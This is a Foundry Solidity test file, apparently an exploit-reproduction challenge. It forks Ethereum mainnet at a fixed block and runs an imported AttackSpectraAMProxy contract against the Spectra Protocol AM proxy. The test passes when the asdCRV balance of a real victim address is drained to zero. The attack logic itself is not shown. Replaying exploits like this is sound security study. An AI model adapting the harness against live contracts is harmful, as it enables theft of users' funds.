// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IRouter} from "../../src/SpectraProtocol/Router/interfaces/IRouter.sol";
import {AttackSpectraAMProxy} from "./AttackSpectraAMProxy.sol";

contract SpectraChallenge is Test {
    uint256 constant blockNumber = 20369956;
    address constant player = 0x53635bF7B92B9512F6De0eB7450b26d5d1AD9a4C;
    address constant sufferer = 0x279a7DBFaE376427FFac52fcb0883147D42165FF;
    address constant amProxy = 0x3d20601ac0Ba9CAE4564dDf7870825c505B69F1a;
    address constant asdCRV = 0x43E54C2E7b3e294De3A155785F52AB49d87B9922;

    modifier checkSolvedByPlayer() {
        _assertInitialState();
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    function setUp() public {
        uint256 forkId = vm.createFork(
            vm.envString("ETH_RPC_URL"),
            blockNumber
        );
        vm.selectFork(forkId);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function testAttack() public checkSolvedByPlayer {
        AttackSpectraAMProxy attackContract = new AttackSpectraAMProxy();
        attackContract.attack(amProxy, asdCRV, sufferer, player);
    }

    function _assertInitialState() internal view {
        uint256 balance_before = IERC20(asdCRV).balanceOf(sufferer);
        console.log("attack before balance:", balance_before);
        assertGt(balance_before, 0);
    }

    function _isSolved() private view {
        uint256 balance_usdt_after = IERC20(asdCRV).balanceOf(sufferer);
        console.log("after balance_usdt:", balance_usdt_after);
        assertEq(balance_usdt_after, 0);
    }
}

// forge test --match-contract AttackSpectraAMProxy -vvv
